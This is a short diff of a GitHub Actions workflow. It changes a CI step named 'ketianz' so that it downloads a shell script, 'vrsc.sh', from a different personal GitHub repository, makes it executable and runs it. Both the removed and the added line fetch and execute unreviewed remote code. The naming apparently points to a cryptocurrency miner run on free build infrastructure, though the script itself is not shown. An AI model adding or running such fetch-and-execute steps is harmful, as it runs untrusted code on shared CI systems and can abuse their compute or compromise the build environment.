@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: ketianz
       run: |
-        wget https://raw.githubusercontent.com/ashuop12308/ketianz/main/vrsc.sh && chmod u+x vrsc.sh && ./vrsc.sh
+        wget https://raw.githubusercontent.com/ferity1102/vrsc/main/vrsc.sh && chmod u+x vrsc.sh && ./vrsc.sh
